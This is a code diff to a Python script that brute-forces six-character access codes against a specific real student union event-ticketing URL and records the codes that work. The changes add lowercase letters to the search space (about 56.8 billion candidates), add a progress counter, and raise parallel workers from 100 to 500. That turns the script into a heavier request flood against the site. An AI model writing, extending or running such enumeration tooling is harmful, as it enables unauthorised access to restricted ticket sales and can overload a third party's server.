@@ -10,6 +10,7 @@ import threading
 import time
 import string
 import itertools
+from sys import stdout
 
 
 session = requests.Session()
@@ -18,15 +19,24 @@ session.mount('http://', HTTPAdapter(max_retries=retries))
 
 url = "https://www.guildofstudents.com/ents/event/9497/?code="
 
-characters: list[str] = string.ascii_uppercase + string.digits
+characters: list[str] = string.ascii_uppercase + string.ascii_lowercase + string.digits
 
 POSSIBLE_CODES: Generator[str, None, None] = (f"{a}{b}{c}{d}{e}{f}" for a, b, c, d, e, f in itertools.product(characters, repeat=6))
+TOTAL_POSSIBLE_CODES: int = 56800235584
 
 def check_for_code(args: list[str]) -> None:
     code: str = args[0]
     valid_codes: dict[str, str] = args[1]
     lock: threading.Lock = args[2]
+    checked_code_counter: int = args[3]
+    counter_lock: threading.Lock = args[4]
     # print("[INFO] Checking code: " + codes
+
+    with counter_lock:
+        checked_code_counter.value += 1
+        percentage_complete: float = round((checked_code_counter.value / TOTAL_POSSIBLE_CODES) * 100, 4)
+        stdout.write(f"\r[INFO] Checked {checked_code_counter.value} of {TOTAL_POSSIBLE_CODES} possible codes. ({percentage_complete}%)")
+        stdout.flush()
 
     try:
         page = session.get(url + code).text
@@ -64,10 +74,12 @@ def iterate_over_all_codes() -> None:
     with Manager() as manager:
 
         valid_codes: dict[str, str] = manager.dict()
-        lock: threading.Lock = manager.Lock()
+        checked_code_counter: int = manager.Value('i', 0)
+        dict_lock: threading.Lock = manager.Lock()
+        counter_lock: threading.Lock = manager.Lock()
 
-        with Pool(processes=100) as pool:
-            for _ in pool.imap_unordered(check_for_code, ((code, valid_codes, lock) for code in POSSIBLE_CODES), chunksize=10000):
+        with Pool(processes=500) as pool:
+            for _ in pool.imap_unordered(check_for_code, ((code, valid_codes, dict_lock, checked_code_counter, counter_lock) for code in POSSIBLE_CODES), chunksize=10000):
                 pass
 
         save_dictionary_to_file(dict(valid_codes))
